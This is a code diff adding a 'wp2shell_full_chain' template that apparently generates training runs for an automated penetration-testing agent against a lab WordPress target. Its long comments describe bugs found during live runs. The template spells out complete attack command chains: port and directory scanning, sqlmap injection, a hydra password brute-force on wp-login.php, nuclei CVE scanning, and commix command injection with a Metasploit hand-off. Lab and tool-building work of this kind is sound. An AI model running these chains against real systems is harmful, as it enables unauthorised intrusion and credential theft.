@@ -630,6 +630,216 @@ TWO_STAGE_TEMPLATES = [
     # need in a genuinely TWO-STAGE template (separate stage_1/stage_2
     # structured calls) is still unaddressed.
     {
+        # wp2shell_full_chain -- the "one fairly complete web app, walked
+        # end to end" trajectory: connectivity verification -> dir/file/
+        # hidden-content enumeration -> form/param discovery -> (gated)
+        # sqlmap + credential fuzzing + nuclei CVE scan + commix (with its
+        # real msf_path/--msf-path Metasploit hand-off) + searchsploit +
+        # a metasploit module search. Targets wp2shell (wordpress/
+        # CVE-2026-63030), the project's one full multi-page CMS-plus-
+        # database vulhub lab target (real MySQL backend, unauthenticated
+        # blind-SQLi chain, baked-in admin/admin default creds) -- see
+        # training-data/README.md's target-selection note for why this
+        # one was picked over Drupalgeddon2 (no db service), phpMyAdmin
+        # (the target IS a db tool, not a business app), and Magento/
+        # Joomla (narrower tooling coverage).
+        #
+        # This is a GENUINE two-stage template (unlike dvwa_commix_exec_
+        # chain's single-shell-invocation workaround above), but it still
+        # doesn't solve the cross-step-value-passing gap documented in the
+        # removed authenticated_sqli_dump_chain note just above -- it
+        # sidesteps it differently: stage_1 and stage_2 are each their own
+        # single big run_command shell chain (same $VAR-capture pattern as
+        # every other chain in this file), and the value that crosses the
+        # stage_1 -> stage_2 boundary (the deduped, param-bearing URL
+        # list) is passed via a FILE on the exec target's own persistent
+        # /tmp (docker exec against the same long-lived container, not a
+        # fresh one per call), not via a template placeholder. This works
+        # because both stages are run_command, so no structured tool
+        # param (like run_sqlmap's `cookie`) ever needs the dynamic value
+        # substituted into it at template-expansion time -- the raw
+        # sqlmap/commix CLI invocations live directly in stage_2's shell
+        # string instead, same as dvwa_commix_exec_chain's raw commix call.
+        #
+        # No proxy/mitmdump capture tool exists anywhere in this repo (and
+        # there's no browser/client to drive traffic through one in this
+        # headless harness) -- the "URL list with parameters" step is
+        # built directly from gobuster + dirb + katana output instead
+        # (deduped, filtered to lines containing "?"), which is the real
+        # goal (a verified list of param-bearing URLs to feed sqlmap/
+        # commix) without inventing new tool infrastructure.
+        #
+        # `condition_check` matches on stage_1's `WPJSON_CHECK:<code>`
+        # marker, which is deliberately the FIRST thing this chain prints
+        # -- pipeline_chain_builder.py's `_summarize()` truncates a step's
+        # captured stdout to 300 chars before condition_check ever sees
+        # it, and this recon chain's real output (naabu/nmap/gobuster/
+        # dirb/katana, all before the URL list even exists) easily runs
+        # past 300 chars, so anything placed later would never actually be
+        # seen by the regex. Putting a short, deterministic connectivity
+        # marker first (a real curl status-code check against wp-json,
+        # which doubles as this recipe's own "ascertain connectivity"
+        # step) is what makes this gate reliable rather than accidentally
+        # always-blocked or always-passed.
+        #
+        # LIVE-RUN GOTCHA (found by actually running this, first attempt):
+        # the very first version of this chain had no per-tool time bound
+        # and used plain `dirb ... -S` (recursive by default). Against a
+        # real WordPress install -- which has a genuinely large, legitimately
+        # browsable directory tree (wp-content, wp-content/plugins,
+        # wp-content/themes, wp-content/uploads, wp-includes, wp-admin,
+        # each recursively re-scanned with the full wordlist) -- dirb's
+        # default recursion never finished: it was STILL running inside the
+        # exec container more than two hours later, long after the
+        # orchestrator's own `docker exec` subprocess call hit
+        # CONFIG.EXEC_TIMEOUT_SECONDS and gave up (recorded as an
+        # `ssh_timeout` failure -- remote_exec.py reuses that label for
+        # local_docker's own timeout too, see its own comment). Confirmed
+        # via `docker exec kali-agent-box ps aux` that the orphaned dirb
+        # process was still alive and accumulating CPU time well after the
+        # harness itself had already failed and exited -- killing the local
+        # `docker exec` client does NOT kill the process it started inside
+        # the container. Fixed two ways: (1) `-r` disables dirb's
+        # recursion entirely -- a single non-recursive pass is enough for
+        # this recipe's actual goal (hidden/backup-file discovery), real
+        # recursive crawling is katana's job here, not dirb's; (2) every
+        # long-running sub-command in both stages is now wrapped in
+        # `timeout Ns` so a single hung/slow tool can't consume the whole
+        # 7200s budget (or hang forever past it) and can't leave an
+        # orphaned process behind on this specific failure mode again.
+        #
+        # TWO MORE real bugs found on the next live attempt (after the dirb
+        # fix, stage_1/stage_2 both reported real tool success, but the
+        # captured content told a different story):
+        # (1) remote_exec.py's own subprocess.run() calls used strict UTF-8
+        # decoding -- this stage's real combined stdout (sqlmap at
+        # --level=2 --risk=2 across 10 URLs, piped through hydra/nuclei/
+        # commix, ~3.3MB) contained a few genuinely invalid UTF-8 bytes,
+        # which raised UnicodeDecodeError INSIDE subprocess.run() itself
+        # and got misreported as a generic "ssh_client_error" ("check the
+        # docker binary is on PATH") that hid the real, mostly-valid
+        # output entirely. Fixed at the shared remote_exec.py level (see
+        # its own comment) with errors="replace", not worked around here.
+        # (2) `-t wordpress-templates` is not a real nuclei template path
+        # (confirmed: nuclei printed "[FTL] Could not run nuclei: no
+        # templates provided for scan" and silently continued) --
+        # wordpress-specific templates aren't under one directory in this
+        # nuclei-templates checkout, they're tagged across several
+        # directories (http/exposures/, http/fuzzing/, http/osint/, ...).
+        # Fixed to `-tags wordpress`, nuclei's real mechanism for this.
+        # Also, the WPVER extraction step originally grepped nmap's banner
+        # and gobuster's path list for a "WordPress X.Y" string -- neither
+        # file ever contains one (nmap only sees the Apache banner; gobuster
+        # only lists paths, not page content), so WPVER was always empty
+        # and `searchsploit ""` silently dumped the ENTIRE exploit-db
+        # (22000+ lines) every run. Fixed by curling the homepage and
+        # grepping its `<meta name="generator" content="WordPress X.Y">`
+        # tag instead (confirmed live: returns "WordPress 6.9.4"), guarded
+        # so searchsploit is skipped entirely if that comes back empty.
+        #
+        # LIVE-VERIFIED end to end after all of the above: real findings
+        # included admin/admin recovered by hydra against wp-login.php (the
+        # image's own documented default), sqlmap correctly reporting all
+        # 10 discovered param-bearing URLs as NOT injectable at --level=2
+        # --risk=2 (an honest negative -- CVE-2026-63030's real SQLi is in
+        # the /wp/v2/batch endpoint's JSON request body via
+        # author__not_in/author_exclude, not a plain GET query param, so
+        # this is the expected result, not a broken chain), commix
+        # correctly finding none of those same URLs OS-command-injectable
+        # (same reasoning), and -- the actual payoff -- nuclei's `-tags
+        # wordpress` pass identifying BOTH real CVEs live on the target:
+        # "CVE-2026-63030 critical http://<target>/?rest_route=/batch/v1"
+        # (this exact recipe's own target vulnerability) and a bonus
+        # "CVE-2026-64638 high" on wp-login.php. searchsploit correctly
+        # fingerprinted "WordPress 6.9.4" and ran a real (if generic, core-
+        # WordPress-level) lookup against it.
+        "template_id": "wp2shell_full_chain",
+        "verified": True,
+        "condition_check": "WPJSON_CHECK:(200|301|302)",
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "echo \"WPJSON_CHECK:$(curl -s -o /dev/null -w '%{{http_code}}' "
+                    "http://{target}/wp-json/)\" ; "
+                    "timeout 60 naabu -host {target} -top-ports 1000 -silent "
+                    "| tee /tmp/wp2shell_ports.txt >/dev/null ; "
+                    "PORTS=$(cut -d: -f2 /tmp/wp2shell_ports.txt | sort -u | paste -sd,) ; "
+                    "timeout 120 nmap -sV -p\"$PORTS\" {target} "
+                    "| tee /tmp/wp2shell_nmap.txt >/dev/null ; "
+                    "timeout 180 gobuster dir -u http://{target} "
+                    "-w /usr/share/seclists/Discovery/Web-Content/common.txt "
+                    "-q -o /tmp/wp2shell_gobuster_raw.txt ; "
+                    "awk '{{print $1}}' /tmp/wp2shell_gobuster_raw.txt | sed 's#^/##' "
+                    "| sed \"s#^#http://{target}/#\" | tee /tmp/wp2shell_dirs.txt >/dev/null ; "
+                    "timeout 180 dirb http://{target} /usr/share/wordlists/dirb/common.txt "
+                    "-o /tmp/wp2shell_dirb.txt -S -r ; "
+                    "timeout 90 katana -u http://{target} -depth 3 -silent "
+                    "| tee /tmp/wp2shell_katana.txt >/dev/null ; "
+                    "cat /tmp/wp2shell_dirs.txt /tmp/wp2shell_dirb.txt /tmp/wp2shell_katana.txt "
+                    "2>/dev/null | grep -oE 'https?://[^ \"]+' | sort -u "
+                    "| tee /tmp/wp2shell_urls.txt >/dev/null ; "
+                    "grep -F '?' /tmp/wp2shell_urls.txt | tee /tmp/wp2shell_param_urls.txt ; "
+                    "echo \"=== URL_COUNT: $(wc -l < /tmp/wp2shell_urls.txt) "
+                    "PARAM_URL_COUNT: $(wc -l < /tmp/wp2shell_param_urls.txt) ===\""
+                ),
+            },
+        ],
+        "stage_2": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "while read -r u; do echo \"--- sqlmap: $u ---\"; "
+                    "timeout 90 sqlmap -u \"$u\" --batch --level=2 --risk=2 "
+                    "--technique=B 2>&1 | tail -20; done < /tmp/wp2shell_param_urls.txt ; "
+                    "timeout 120 hydra -l admin -P {cred_wordlist} -t 16 -I "
+                    "http-post-form://{target}/wp-login.php:"
+                    "\"log=^USER^&pwd=^PASS^&wp-submit=Log+In\":F=incorrect ; "
+                    "timeout 120 nuclei -target http://{target} -tags wordpress "
+                    "-severity medium,high,critical -silent "
+                    "| tee /tmp/wp2shell_nuclei.txt ; "
+                    "WPVER=$(curl -s http://{target}/ | grep -oE 'WordPress [0-9.]+' | head -1) ; "
+                    "echo \"--- searchsploit: $WPVER ---\" ; "
+                    "if [ -n \"$WPVER\" ]; then searchsploit \"$WPVER\" 2>&1; "
+                    "else echo 'NO_VERSION_FINGERPRINTED -- skipping searchsploit rather than "
+                    "running it with an empty query (dumps the entire exploit-db)'; fi ; "
+                    "CONFIRMED=\"\" ; "
+                    "while read -r u; do "
+                    "OUT=$(timeout 60 commix -u \"$u\" --batch --ignore-stdin --os-cmd=id "
+                    "--answers='shell=N,random=Y,use the URL=Y,Insufficient=Y' 2>&1) ; "
+                    "if echo \"$OUT\" | grep -q 'uid='; then CONFIRMED=\"$u\"; "
+                    "echo \"$OUT\"; break; fi ; "
+                    "done < /tmp/wp2shell_param_urls.txt ; "
+                    "if [ -n \"$CONFIRMED\" ]; then "
+                    "timeout 90 commix -u \"$CONFIRMED\" --batch --ignore-stdin --os-cmd=id "
+                    "--msf-path=/usr/share/metasploit-framework "
+                    "--answers='shell=N,random=Y,use the URL=Y,Insufficient=Y' 2>&1 ; "
+                    "else echo 'NO_CONFIRMED_INJECTION -- honest negative, not a bug, "
+                    "see wp2shell_full_chain comment re CVE-2026-63030 needing a "
+                    "/wp/v2/batch JSON-body payload rather than a plain query param'; "
+                    "fi"
+                ),
+            },
+            # Search-only, deliberately -- mirrors agent.py's own
+            # _is_recon_safe_step distinction (search allowed, use/run
+            # gated) even though stage_2 here is already exploit_
+            # conditional; a real exploit run belongs in a later,
+            # human/model-reviewed round once this search's real output
+            # picks a specific module, not auto-fired blind in the same
+            # chain as the recon that found the lead.
+            {"tool": "run_metasploit", "commands": "search wordpress"},
+        ],
+        "variations": [
+            {
+                "target": "172.27.0.3",
+                "cred_wordlist": (
+                    "/usr/share/seclists/Passwords/Common-Credentials/"
+                    "top-20-common-SSH-passwords.txt"
+                ),
+            },
+        ],
+    },
+    {
         # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
         # examples anywhere in the corpus before this template (one of
         # the 4 tools README's Known Gaps calls out by name). Genuinely
